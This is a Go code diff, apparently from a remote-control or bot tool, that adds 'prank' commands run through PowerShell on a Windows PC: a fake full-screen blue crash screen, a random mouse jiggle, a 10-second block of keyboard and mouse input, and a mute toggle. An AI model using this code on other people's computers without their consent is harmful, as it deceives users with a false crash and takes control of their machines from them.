@@ -126,7 +126,41 @@ func prankRun(kind, arg string) string {
 		}
 		return "boutons de souris inversés (renvoyer la commande les remet)."
 
+	case "bsod", "ecran":
+		// Faux écran bleu plein écran, refermable par Échap.
+		script := "Add-Type -AssemblyName PresentationFramework;" +
+			"$w = New-Object System.Windows.Window;" +
+			"$w.WindowStyle='None'; $w.ResizeMode='NoResize'; $w.WindowState='Maximized';" +
+			"$w.Background='#0A2472'; $w.Topmost=$true;" +
+			"$t = New-Object System.Windows.Controls.TextBlock;" +
+			"$t.Text=('Un probleme est survenu et votre PC doit redemarrer.' + [char]10 + [char]10 + 'Arretez le code : CRITICAL_PROCESS_DIED');" +
+			"$t.Foreground='White'; $t.FontSize=28; $t.Margin='80'; $t.TextWrapping='Wrap';" +
+			"$w.Content=$t; [void]$w.ShowDialog()"
+		go runPSUTF8(script)
+		return "faux écran bleu affiché (Échap pour fermer)."
+
+	case "jiggle", "souris":
+		script := `Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class MS { [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y); }';` +
+			"1..60 | ForEach-Object { [MS]::SetCursorPos((Get-Random -Min 100 -Max 1800), (Get-Random -Min 100 -Max 900)); Start-Sleep -Milliseconds 40 }"
+		go runPSUTF8(script)
+		return "souris agitée 60 fois."
+
+	case "keyboard", "clavier":
+		// Bloque clavier et souris 10 secondes, puis les rend.
+		script := `Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class BI { [DllImport("user32.dll")] public static extern bool BlockInput(bool f); }';` +
+			"[BI]::BlockInput($true); Start-Sleep -Seconds 10; [BI]::BlockInput($false)"
+		go runPSUTF8(script)
+		return "clavier et souris bloqués 10 s."
+
+	case "mute", "muet":
+		script := `Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class KB { [DllImport("user32.dll")] public static extern void keybd_event(byte k, byte s, uint f, System.IntPtr e); }';` +
+			"[KB]::keybd_event(0xAD,0,0,[IntPtr]::Zero); [KB]::keybd_event(0xAD,0,2,[IntPtr]::Zero)"
+		if _, err := runPSUTF8(script); err != nil {
+			return "mute : " + err.Error()
+		}
+		return "son coupé (renvoyer la commande le remet)."
+
 	default:
-		return "blagues : msg, wall, url, speak, beep, cd, rotate, taskbar, volume, lock, swapmouse"
+		return "blagues : msg, wall, url, speak, beep, cd, rotate, taskbar, volume, lock, swapmouse, bsod, jiggle, keyboard, mute"
 	}
 }
